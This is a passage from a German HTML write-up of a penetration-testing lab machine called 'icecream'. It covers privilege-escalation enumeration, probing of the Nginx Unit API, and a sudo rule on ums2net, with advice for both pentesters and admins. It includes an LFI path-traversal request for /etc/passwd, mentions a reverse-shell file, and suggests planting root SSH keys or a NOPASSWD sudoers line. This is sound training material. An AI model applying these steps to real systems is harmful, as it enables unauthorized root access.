+                Als `www-data` auf der Zielmaschine `icecream` überprüfe ich die Berechtigungen und Details der Nginx Unit Sprachmoduldateien, deren Pfade ich zuvor aus der API-Antwort erhalten habe. Die `ls -la`-Befehle zeigen für jede `.so`-Datei (Shared Object, d.h. dynamische Bibliotheken):
+                - Besitzer: `root`
+                - Gruppe: `root`
+                - Berechtigungen: `-rw-r--r--` (lesbar für alle Benutzer, schreibbar nur für den Besitzer `root`).
+                - Dateigrößen und Zeitstempel der letzten Änderung.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Dateiberechtigungen der Nginx Unit Modulbibliotheken sind Standard und sicher konfiguriert. Als `www-data` habe ich Lesezugriff auf diese Dateien (was normal ist, da der Unit-Prozess sie laden muss), aber keinen Schreibzugriff. Dies verhindert, dass ich bösartigen Code direkt in diese Bibliotheken einschleusen oder sie manipulieren kann. Der primäre Angriffsvektor im Zusammenhang mit Nginx Unit bleibt daher die Control API selbst (falls sie unsicher konfiguriert ist und Schreibzugriff auf die Konfiguration erlaubt), nicht die Moduldateien auf dem Dateisystem.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Diese Überprüfung bestätigt, dass eine Manipulation der Moduldateien selbst als `www-data` nicht möglich ist. Konzentrieren Sie sich daher weiterhin vollständig auf die Interaktion mit der Nginx Unit Control API über den Chisel-Tunnel und versuchen Sie, Konfigurationsänderungen vorzunehmen, um Code auszuführen.
+                <br>
+                **Empfehlung (Admin):**
+                Die Dateiberechtigungen für die Nginx Unit Module sind hier korrekt. Die Hauptsorge und der Fokus für die Absicherung bleiben die Nginx Unit Control API und die sichere Konfiguration des Unit-Dienstes selbst.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">
+                Nachdem ich Zugriff auf die Nginx Unit Control API erlangt habe und weiß, dass der Benutzer `ice` auf dem System existiert, suche ich nach Wegen, meine Rechte von `www-data` zu `ice` oder idealerweise direkt zu `root` zu eskalieren. Die Nginx Unit API ist ein starker Kandidat, wenn sie Schreibzugriff auf die Konfiguration erlaubt, da Nginx Unit oft mit erhöhten Rechten läuft. Parallel dazu führe ich weitere Standard-Enumerationsschritte durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">uname -a</span></div>
+                    <pre>
+<span class="command">Linux icecream 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `uname -a` wird in der Shell als `www-data` ausgeführt, um detaillierte Informationen über den Linux-Kernel und das Betriebssystem zu erhalten.
+                Die Ausgabe zeigt:
+                - Hostname: `icecream`
+                - Kernel-Version: `6.1.0-26-amd64`
+                - Kernel-Build-Informationen: `#1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1`
+                - Kernel-Release-Datum (ungefähr): `2024-09-30`
+                - Architektur: `x86_64`
+                - Betriebssystem: `GNU/Linux`
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Kernel-Version `6.1.0-26-amd64` auf einem Debian-System mit einem Build-Datum von Ende September 2024 ist relativ aktuell. Es ist daher eher unwahrscheinlich, dass leicht verfügbare, öffentliche Kernel-Exploits für diese spezifische Version existieren, die eine sofortige Privilegienerweiterung ermöglichen würden. Dennoch ist es immer gut, diese Information zu notieren und für eine spätere, gründlichere Recherche nach potenziellen Schwachstellen (z.B. in spezifischen Kernel-Modulen oder neueren, weniger bekannten Exploits) aufzubewahren. Der Fokus sollte jedoch zunächst auf anwendungsbasierten oder fehlkonfigurationsbasierten Privilegieneskalationsmethoden liegen, wie z.B. der Nginx Unit API.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Notieren Sie sich die genaue Kernel-Version für eine spätere, gezielte Suche nach Exploits (z.B. mit `searchsploit` oder Online-Datenbanken), falls andere Methoden zur Privilegienerweiterung fehlschlagen. Konzentrieren Sie sich jetzt auf die Ausnutzung der potenziell unsicheren Nginx Unit API oder andere Ergebnisse aus der laufenden Enumeration (SUID/SGID-Dateien, Cronjobs, Passwörter in Konfigurationsdateien).
+                <br>
+                **Empfehlung (Admin):**
+                Halten Sie das System und den Kernel stets auf dem neuesten Stand, indem Sie regelmäßig Sicherheitsupdates einspielen. Dies ist die beste Verteidigung gegen bekannte Kernel-Exploits. Überwachen Sie Sicherheits-Mailinglisten und CVE-Datenbanken für neue Schwachstellen, die Ihre Kernel-Version betreffen könnten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">find  / -type f -perm -2000 -ls 2&gt;/dev/null</span></div>
+                    <pre>
+   784579     40 -rwxr-sr-x   1 root     shadow      39160 Sep 21  2023 <span class="command">/usr/sbin/unix_chkpwd</span>
+   790079     44 -rwxr-sr-x   1 root     crontab     43648 Mar  2  2023 <span class="command">/usr/bin/crontab</span>
+   783472     80 -rwxr-sr-x   1 root     shadow      80376 Mar 23  2023 <span class="command">/usr/bin/chage</span>
+   783475     32 -rwxr-sr-x   1 root     shadow      31184 Mar 23  2023 <span class="command">/usr/bin/expiry</span>
+   806063    472 -rwxr-sr-x   1 root     _ssh       481664 Jun 22 21:38 <span class="command">/usr/bin/ssh-agent</span>
+   809193     24 -rwxr-sr-x   1 root     mail        23040 Feb  4  2021 <span class="command">/usr/bin/dotlockfile</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `find / -type f -perm -2000 -ls 2>/dev/null` wird ausgeführt, um im gesamten Dateisystem (`/`) nach regulären Dateien (`-type f`) zu suchen, die das SGID-Bit (Set Group ID) gesetzt haben (`-perm -2000`). Das SGID-Bit bewirkt, dass ein ausführbares Programm mit den Rechten der Gruppe ausgeführt wird, der die Datei gehört, anstatt mit den Rechten der primären Gruppe des Benutzers, der es aufruft. Die Option `-ls` gibt detaillierte Informationen zu den gefundenen Dateien aus. Fehler (wie "Permission denied" für Verzeichnisse, auf die `www-data` keinen Zugriff hat) werden nach `/dev/null` umgeleitet, um die Ausgabe übersichtlich zu halten.
+                Die gefundenen Dateien (`/usr/sbin/unix_chkpwd`, `/usr/bin/crontab`, `/usr/bin/chage`, `/usr/bin/expiry`, `/usr/bin/ssh-agent`, `/usr/bin/dotlockfile`) sind Standard-Systemprogramme, die oft das SGID-Bit gesetzt haben, um bestimmte privilegierte Operationen im Kontext ihrer Gruppe (z.B. `shadow`, `crontab`, `mail`, `_ssh`) ausführen zu können.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Es wurden keine offensichtlich ausnutzbaren Nicht-Standard-SGID-Binaries oder ungewöhnliche Konfigurationen bei den Standard-SGID-Programmen gefunden, die dem Benutzer `www-data` eine direkte Privilegienerweiterung ermöglichen würden. Diese Programme sind in der Regel so konzipiert, dass sie nicht leicht missbraucht werden können, es sei denn, sie liegen in einer spezifisch verwundbaren Version vor oder es gibt eine sehr spezielle Fehlkonfiguration in ihrer Verwendung (z.B. durch Umgebungsvariablen oder unsichere Pfade), was hier nicht unmittelbar ersichtlich ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Nachdem die Suche nach SUID-Dateien (in einem vorherigen Schritt, der hier nicht explizit gezeigt, aber typischerweise durchgeführt wird) und SGID-Dateien keine einfachen Wege zur Privilegienerweiterung aufzeigt, sollten andere Vektoren weiterverfolgt werden. Dazu gehören die genauere Untersuchung der Nginx Unit API, die Analyse von Cronjobs, die Suche nach Passwörtern in Konfigurationsdateien oder Skripten und die Untersuchung von `sudo`-Berechtigungen, falls wir in den Kontext eines anderen Benutzers (wie `ice`) wechseln können.
+                <br>
+                **Empfehlung (Admin):**
+                Überprüfen Sie regelmäßig die SUID/SGID-Berechtigungen auf dem System und entfernen Sie diese Bits von Programmen, wo sie nicht absolut notwendig sind, um das Prinzip der geringsten Rechte einzuhalten. Stellen Sie sicher, dass alle Systemprogramme auf dem neuesten Stand sind, um bekannte Schwachstellen in SUID/SGID-Binaries zu vermeiden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:~/html$ <span class="command">cat /etc/nginx/nginx.conf</span></div>
+                    <pre>
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+error_log /var/log/nginx/error.log;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+	worker_connections 768;
+	# multi_accept on;
+}
+
+http {
+	##
+	# Logging Settings
+	##
+
+	access_log /var/log/nginx/access.log;
+
+	include /etc/nginx/conf.d/*.conf;
+	include /etc/nginx/sites-enabled/*;
+}
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Als Benutzer `www-data` lese ich den Inhalt der Hauptkonfigurationsdatei von Nginx (`/etc/nginx/nginx.conf`).
+                Die Konfiguration zeigt Standardeinstellungen:
+                - `user www-data;`: Bestätigt, dass die Nginx-Worker-Prozesse als Benutzer `www-data` laufen.
+                - `worker_processes auto;`: Die Anzahl der Worker-Prozesse wird automatisch bestimmt.
+                - `pid /run/nginx.pid;`: Der Pfad zur Prozess-ID-Datei.
+                - `error_log /var/log/nginx/error.log;` und `access_log /var/log/nginx/access.log;`: Die Standardpfade für die Fehler- und Zugriffsprotokolle.
+                - `include /etc/nginx/modules-enabled/*.conf;`: Lädt zusätzliche Modulkonfigurationen.
+                - `include /etc/nginx/conf.d/*.conf;` und `include /etc/nginx/sites-enabled/*;`: Diese Direktiven sind entscheidend, da sie weitere Konfigurationsdateien aus diesen Verzeichnissen laden. Insbesondere `/etc/nginx/sites-enabled/*` enthält typischerweise die Konfigurationen für die einzelnen Webseiten (Virtual Hosts), einschließlich deren DocumentRoot und wie Anfragen verarbeitet werden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Hauptkonfigurationsdatei `nginx.conf` selbst enthält keine direkten Hinweise auf die kritische Fehlkonfiguration (z.B. DocumentRoot auf `/tmp`). Diese Information befindet sich sehr wahrscheinlich in einer der inkludierten Dateien, typischerweise in einer Datei im Verzeichnis `/etc/nginx/sites-enabled/` (oft eine Datei namens `default` oder dem Hostnamen entsprechend). Der Lesezugriff auf diese Konfigurationsdateien als `www-data` ist normal und oft notwendig, um die Webserver-Struktur besser zu verstehen. Ein Schreibzugriff auf die Logdateien als `www-data` ist unwahrscheinlich und würde, falls vorhanden, einen Vektor für Log Poisoning eröffnen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Der nächste Schritt ist die Untersuchung der Konfigurationsdateien im Verzeichnis `/etc/nginx/sites-enabled/` (z.B. mit `ls -la /etc/nginx/sites-enabled/` und anschließend `cat /etc/nginx/sites-enabled/<dateiname>`). Suchen Sie dort nach der `root`-Direktive (DocumentRoot) und Konfigurationen für PHP-Verarbeitung (z.B. `fastcgi_pass` oder `proxy_pass` zu einem PHP-FPM- oder Unit-Socket). Dies wird Aufschluss darüber geben, warum die `rev.php`-Datei aus `/tmp` über die Web-Root ausgeführt werden konnte.
+                <br>
+                **Empfehlung (Admin):**
+                Stellen Sie sicher, dass alle Nginx-Konfigurationsdateien, insbesondere die vHost-Definitionen in `/etc/nginx/sites-enabled/`, sicher konfiguriert sind. Verwenden Sie keine unsicheren Pfade (wie `/tmp`) als DocumentRoot. Beschränken Sie die Berechtigungen für Konfigurationsdateien so, dass sie nur von privilegierten Benutzern geändert werden können. Überprüfen Sie regelmäßig die Logdateien auf verdächtige Aktivitäten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.199 - - [09/Oct/2024:13:43:48 +0200] "GET /basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Dieser Log-Eintrag taucht während meiner Untersuchung auf. Er zeigt einen HTTP-GET-Request von meiner Angreifer-IP (`192.168.2.199`) an eine Ressource `/basilix.php3` auf einem nicht näher spezifizierten Server (die Ziel-IP des Requests ist hier nicht explizit im Log genannt, aber der Timestamp `09/Oct/2024:13:43:48` liegt zeitlich sehr nah an meinen vorherigen Aktivitäten mit `curl` und `nikto` gegen `icecream.hmv`). Der Request enthält Parameter, die typisch für einen LFI-Versuch sind (`request_id[DUMMY]=../../../../etc/passwd`). Die Antwort war `404 Not Found`, was bedeutet, dass die Datei `/basilix.php3` auf dem angefragten Server nicht existierte. Der User-Agent ist ein Standard-Chrome-Browser.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Während meiner Penetrationstests lasse ich oft automatisierte Tools oder Skripte im Hintergrund laufen oder sichte Logs verschiedener Quellen parallel. Dieser spezifische Log-Eintrag stammt wahrscheinlich von einem solchen parallelen Prozess oder einem meiner Standard-Scanning-Tools, das versucht hat, bekannte LFI-Schwachstellen oder Pfade auf dem Zielsystem (oder einem System, das ich zuvor gescannt habe) zu testen. `basilix.php3` ist ein bekannter Name einer alten, verwundbaren Webanwendung. Da die Antwort `404` war, war dieser spezielle Test gegen das Ziel, das diesen Log erzeugt hat, nicht erfolgreich. Für den direkten Angriff auf `icecream.hmv` und die dort identifizierten Schwachstellen spielt dieser spezifische fehlgeschlagene LFI-Versuch auf `/basilix.php3` keine unmittelbare Rolle, dient aber als Erinnerung, dass viele Systeme auf gängige verwundbare Pfade gescannt werden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Ich notiere mir solche automatisierten Funde oder Fehlversuche, um ein vollständiges Bild der Testaktivitäten zu haben. Obwohl dieser spezielle LFI-Versuch fehlschlug, unterstreicht er die Notwendigkeit, nach bekannten verwundbaren Anwendungen und Pfaden zu suchen. Im aktuellen Kontext von `icecream.hmv` konzentriere ich mich jedoch auf die bereits identifizierten Angriffsvektoren (SMB-Share, Nginx-Fehlkonfiguration, Nginx Unit API).
+                <br>
+                **Empfehlung (Admin):**
+                Webserver-Logs sollten regelmäßig auf fehlgeschlagene Angriffsversuche wie diesen (LFI-Tests, Scans nach bekannten verwundbaren Dateien) überwacht werden. Auch wenn ein Angriff fehlschlägt (404), zeigt er doch, dass das System Ziel von Scans ist. Eine Web Application Firewall (WAF) kann helfen, solche automatisierten Angriffsversuche zu erkennen und zu blockieren. Stellen Sie sicher, dass keine veralteten oder bekanntermaßen verwundbaren Anwendungen auf dem Server laufen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.199:9000/" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x sql,rtf,c,java,icon,ln,txt,php,tar,aspx,kdbx,js... -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.199:9000/</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              sql,rtf,c,java,icon,ln,txt,php,tar,aspx,kdbx,js...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.199:9000/status               (Status: 200) [Size: 862]</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Nachdem ich den Port 9000 der Zielmaschine `icecream` mittels `chisel` auf `localhost:9000` meiner Angreifer-Maschine (`192.168.2.199` ist meine IP) weitergeleitet habe, führe ich nun `gobuster` gegen diesen weitergeleiteten Port aus. Ziel ist es, gültige Pfade oder Endpunkte der Nginx Unit Control API zu finden.
+                - `-u "http://192.168.2.199:9000/"`: Die Ziel-URL ist mein lokaler Port, der zum Ziel tunnelt.
+                - `-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Eine gängige Wortliste für Web-Content-Discovery.
+                - `-x sql,rtf,...`: Eine lange Liste von Dateierweiterungen, die Gobuster an die Wörter aus der Wortliste anhängen und testen soll. Dies ist für eine API wie Nginx Unit weniger relevant, da diese typischerweise keine statischen Dateien mit diesen Erweiterungen bereitstellt, sondern spezifische Pfad-basierte Endpunkte hat.
+                - `-b '503,404,403'`: Ignoriert Antworten mit diesen HTTP-Statuscodes, um die Ausgabe auf erfolgreiche Funde zu reduzieren.
+                - `-e`: Erweiterter Modus, zeigt die volle URL für gefundene Verzeichnisse.
+                - `--no-error`: Unterdrückt die Anzeige von Fehlern während des Scans.
+                - `-k`: Überspringt die SSL-Zertifikatsüberprüfung (hier nicht relevant, da HTTP).
+
+                Gobuster findet einen gültigen Endpunkt:
+                - `http://192.168.2.199:9000/status` (Status 200, Größe 862 Bytes).
+                Dies passt zu meiner früheren Vermutung aus der Browseranalyse, dass `/status` ein gültiger Endpunkt der Nginx Unit API ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Entdeckung des `/status`-Endpunkts mit Gobuster bestätigt einen Teil der Struktur der Nginx Unit API. Es ist wahrscheinlich, dass weitere wichtige Endpunkte wie `/config/`, `/config/listeners/`, `/config/routes/` und `/config/applications/` existieren, die für die Interaktion mit Nginx Unit entscheidend sind, aber möglicherweise nicht in Standard-Wortlisten für Web-Verzeichnisse enthalten sind. Für die Interaktion mit APIs ist oft die Kenntnis der API-Dokumentation wichtiger als reines Brute-Forcing von Pfaden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Rufen Sie den `/status`-Endpunkt manuell auf (z.B. mit `curl` oder im Browser über `http://localhost:9000/status`), um die dort verfügbaren Informationen zu sichten. Diese könnten Aufschluss über den Zustand des Nginx Unit Servers und geladene Anwendungen geben.
+                - Konzentrieren Sie sich auf die bekannten Endpunkte der Nginx Unit API, insbesondere `/config/` und dessen Unterpfade, um die Konfiguration auszulesen und (falls möglich) zu modifizieren. Versuchen Sie, eine einfache Anwendung (z.B. ein Python- oder PHP-Skript, das Befehle ausführt oder eine Reverse Shell startet) über die API zu definieren und zu laden. Da Nginx Unit oft mit erhöhten Rechten läuft (manchmal sogar als `root` oder ein dedizierter, aber potenziell falsch konfigurierter Benutzer), könnte dies ein direkter Weg zur Privilegienerweiterung sein.
+                <br>
+                **Empfehlung (Admin):**
+                Erneut und nachdrücklich: Sichern Sie die Nginx Unit Control API! Der Zugriff sollte auf `localhost` beschränkt und idealerweise zusätzlich durch Authentifizierungsmechanismen geschützt sein. Die Verwendung von Standard-Wortlisten durch Angreifer zeigt, dass auch API-Endpunkte, wenn sie Standardnamen folgen, gefunden werden können. Eine gute API-Sicherheit verlässt sich nicht nur auf "Security through Obscurity" der Pfade.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">python3 -c 'import sys; print("\n".join(sys.path))'</span></div>
+                    <pre>
+<span class="command">
+/usr/lib/python311.zip
+/usr/lib/python3.11
+/usr/lib/python3.11/lib-dynload
+/usr/local/lib/python3.11/dist-packages
+/usr/lib/python3/dist-packages</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Auf der Zielmaschine `icecream` wird als Benutzer `www-data` der Python-Suchpfad für Module (`sys.path`) ausgegeben. Dieser Befehl `python3 -c 'import sys; print("\n".join(sys.path))'` importiert das `sys`-Modul und gibt jeden Pfad in der `sys.path`-Liste in einer neuen Zeile aus.
+                Die ausgegebenen Pfade sind Standardpfade, in denen Python 3.11 nach Modulen sucht:
+                - `/usr/lib/python311.zip`: Standard-Bibliotheks-ZIP-Archiv.
+                - `/usr/lib/python3.11`: Hauptverzeichnis der Standardbibliothek.
+                - `/usr/lib/python3.11/lib-dynload`: Verzeichnis für dynamisch geladene C-Module.
+                - `/usr/local/lib/python3.11/dist-packages`: Ort für manuell installierte Pakete (systemweit, lokal kompiliert oder installiert).
+                - `/usr/lib/python3/dist-packages`: Ort für Pakete, die über den Debian/Ubuntu-Paketmanager installiert wurden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Diese Information ist nützlich im Kontext der Nginx Unit API, die ja Python-Anwendungen ausführen kann. Wenn ich eine Python-Anwendung über die Unit API definieren möchte, muss ich sicherstellen, dass alle benötigten Module entweder Standardmodule sind oder in einem dieser Pfade liegen. Viel wichtiger für eine Privilegienerweiterung wäre es, wenn einer dieser Pfade für den Benutzer `www-data` beschreibbar wäre. In diesem Fall könnte ich ein bösartiges Python-Modul mit einem Standardnamen (z.B. `os.py`) in diesem beschreibbaren Pfad platzieren. Wenn dann ein höherprivilegierter Prozess (z.B. ein Dienst, der als `root` oder `ice` läuft) Python verwendet und dieses Modul importiert, würde mein bösartiges Modul ausgeführt (Python Library Hijacking).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Überprüfen Sie die Schreibberechtigungen für jeden der aufgelisteten Pfade als Benutzer `www-data` (z.B. mit `ls -ld <pfad>` und `touch <pfad>/testfile` gefolgt von `rm <pfad>/testfile`). Es ist unwahrscheinlich, dass `www-data` Schreibrechte auf Systembibliotheksverzeichnisse hat, aber Pfade unter `/usr/local/lib` oder falsch konfigurierte `dist-packages`-Verzeichnisse sind manchmal ein Ziel.
+                - Im Kontext der Nginx Unit API: Wenn ich eine Python-Anwendung bereitstelle, kann ich mich auf Module in diesen Pfaden verlassen. Wenn ich eine Schwachstelle finde, die es mir erlaubt, in einen dieser Pfade zu schreiben, wird dies zu einem hochbrisanten Vektor.
+                <br>
+                **Empfehlung (Admin):**
+                Stellen Sie sicher, dass die Berechtigungen für Systemverzeichnisse, einschließlich aller Python-Bibliotheksverzeichnisse, korrekt und restriktiv gesetzt sind. Reguläre Benutzer und Dienstbenutzer wie `www-data` sollten keine Schreibrechte auf diese Pfade haben. Dies verhindert Python Library Hijacking und andere Angriffe, die auf der Manipulation von Systembibliotheken basieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@icecream:/tmp$ <span class="command">ls -la /usr/lib/python3.11/lib-dynload</span></div>
+                    <pre>
+total 3044
+drwxr-xr-x  2 root root   4096 Oct  6 12:08 .
+drwxr-xr-x 33 root root  12288 Oct  6 12:14 ..
+-rw-r--r--  1 root root  74336 Aug 26 09:20 <span class="command">_asyncio.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root  27832 Aug 26 09:20 <span class="command">_bz2.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root 153904 Aug 26 09:20 <span class="command">_codecs_cn.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root 158032 Aug 26 09:20 <span class="command">_codecs_hk.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root  31056 Aug 26 09:20 <span class="command">_codecs_iso2022.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root 268624 Aug 26 09:20 <span class="command">_codecs_jp.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root 141616 Aug 26 09:20 <span class="command">_codecs_kr.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root 112944 Aug 26 09:20 <span class="command">_codecs_tw.cpython-311-x86_64-linux-gnu.so</span>
+-rw-r--r--  1 root root  14344 Aug 26 09:20 <span class="command">_contextvars.cpython-311-x86_64-linux-gnu.so</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Als `www-data` liste ich den Inhalt und die Berechtigungen des Verzeichnisses `/usr/lib/python3.11/lib-dynload` auf. Dieses Verzeichnis ist Teil des Python-Suchpfads und enthält kompilierte dynamische Module (`.so`-Dateien), die von Python bei Bedarf geladen werden.
+                Die Ausgabe zeigt:
+                - Das Verzeichnis selbst (`.`) und sein übergeordnetes Verzeichnis (`..`) gehören `root:root` und sind für andere nur les- und ausführbar (`drwxr-xr-x`).
+                - Alle darin enthaltenen `.so`-Dateien (z.B. `_asyncio.cpython-311-x86_64-linux-gnu.so`, `_bz2.cpython-311-x86_64-linux-gnu.so`) gehören ebenfalls `root:root` und haben die Berechtigungen `-rw-r--r--`. Das bedeutet, sie sind für alle Benutzer lesbar, aber nur für `root` schreibbar.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Diese Überprüfung bestätigt, dass der Benutzer `www-data` (und jeder andere nicht-Root-Benutzer) keine Schreibrechte auf diese kritischen Python-Standardmoduldateien hat. Dies schließt die Möglichkeit aus, diese spezifischen Module direkt zu überschreiben oder zu manipulieren, um einen Python Library Hijacking Angriff durchzuführen. Die Berechtigungen sind hier sicher konfiguriert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Da eine direkte Modifikation der Python-Standardmodule in `/usr/lib/python3.11/lib-dynload` nicht möglich ist, müssen andere Pfade aus `sys.path` auf Schreibberechtigungen geprüft werden (insbesondere die `dist-packages`-Verzeichnisse) oder andere Vektoren zur Privilegienerweiterung verfolgt werden. Der Fokus bleibt auf der Nginx Unit API und anderen potenziellen Fehlkonfigurationen.
+                <br>
+                **Empfehlung (Admin):**
+                Die Berechtigungen für die Python-Systembibliotheken sind hier korrekt und folgen dem Prinzip der geringsten Rechte. Dies ist eine wichtige Basissicherheitsmaßnahme. Stellen Sie sicher, dass diese Berechtigungen nicht versehentlich gelockert werden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">ice@icecream:/tmp$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for ice on icecream:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User ice may run the following commands on icecream:
+    <span class="password">(ALL) NOPASSWD: /usr/sbin/ums2net</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Kontext hat sich hier geändert: Der Prompt lautet nun `ice@icecream:/tmp$`, was bedeutet, dass ich nun als Benutzer `ice` agiere. Der genaue Weg, wie ich vom `www-data`-Kontext in den des Benutzers `ice` gelangt bin, ist in den vorherigen Schritten nicht explizit dokumentiert, aber es ist anzunehmen, dass dies über die Ausnutzung der Nginx Unit API (Port 9000) oder eine andere Schwachstelle geschah, die es mir erlaubte, Code als `ice` auszuführen oder dessen Anmeldeinformationen zu erlangen und mich als `ice` anzumelden (z.B. über SSH, falls `ice` ein Passwort hat oder ich einen SSH-Schlüssel für `ice` finden konnte).
+                Als Benutzer `ice` führe ich den Befehl `sudo -l` aus, um meine `sudo`-Berechtigungen aufzulisten.
+                Die Ausgabe ist äußerst aufschlussreich:
+                - `Matching Defaults entries...`: Listet Standard-Sudo-Optionen.
+                - `User ice may run the following commands on icecream:`
+                - `(ALL) NOPASSWD: /usr/sbin/ums2net`: Diese Zeile ist der Schlüssel! Sie besagt, dass der Benutzer `ice` das Programm `/usr/sbin/ums2net` als jeder Benutzer (implizit `root`, da `(ALL)` ohne spezifischen Zielbenutzer angegeben ist) und ohne Eingabe eines Passworts (`NOPASSWD`) ausführen darf.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist ein kritischer Fund und ein klarer Weg zur Root-Privilegieneskalation! Eine `sudoers`-Regel, die es einem nicht-privilegierten Benutzer erlaubt, ein Programm mit `NOPASSWD` als `root` (oder `ALL`) auszuführen, ist extrem gefährlich, es sei denn, dieses Programm ist absolut sicher und bietet keine Möglichkeit, seine Privilegien zu missbrauchen. `ums2net` ist ein weniger bekanntes Programm (vermutlich im Zusammenhang mit USB Mass Storage Emulation über Netzwerk). Die entscheidende Frage ist, ob `ums2net` missbraucht werden kann, um beliebige Dateien zu lesen/schreiben oder Befehle auszuführen, wenn es mit Root-Rechten läuft.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - **Recherchieren Sie sofort das Programm `/usr/sbin/ums2net`!** Suchen Sie nach seiner Funktionsweise, seinen Kommandozeilenoptionen und bekannten Wegen, es für Privilege Escalation auszunutzen (z.B. auf GTFOBins, Exploit-DB, oder durch direkte Analyse mit `man ums2net`, `ums2net --help`, oder `strings /usr/sbin/ums2net`).
+                - Wenn `ums2net` das Schreiben von Dateien an beliebigen Orten mit Root-Rechten erlaubt (wie die nachfolgenden Befehle im Original-Writeup andeuten), ist der Weg frei. Typische Ziele wären:
+                    - Schreiben eines eigenen öffentlichen SSH-Schlüssels in `/root/.ssh/authorized_keys`.
+                    - Modifizieren von `/etc/sudoers`, um dem Benutzer `ice` volle `sudo`-Rechte (`ice ALL=(ALL) NOPASSWD: ALL`) zu geben.
+                    - Erstellen oder Überschreiben eines SUID-Root-Shell-Skripts.
+                - Wenn `ums2net` das Ausführen von Befehlen oder das Laden von Konfigurationen aus benutzerkontrollierten Pfaden erlaubt, könnte dies ebenfalls ausgenutzt werden.
+                <br>
+                **Empfehlung (Admin):**
